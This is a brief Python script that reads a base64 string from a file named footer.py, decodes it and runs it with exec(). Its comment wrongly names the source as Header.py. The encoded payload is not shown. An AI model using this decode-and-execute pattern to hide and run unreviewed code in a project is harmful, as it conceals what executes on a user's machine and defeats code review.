import base64

# Read the Base64 encoded string from Header.py
with open('footer.py', 'r') as file:
    encoded_script = file.read()

# Decode the Base64 encoded script
decoded_script = base64.b64decode(encoded_script)

# Convert the decoded byte object to a string
decoded_script_str = decoded_script.decode('utf-8')

# Run the decoded script
exec(decoded_script_str)
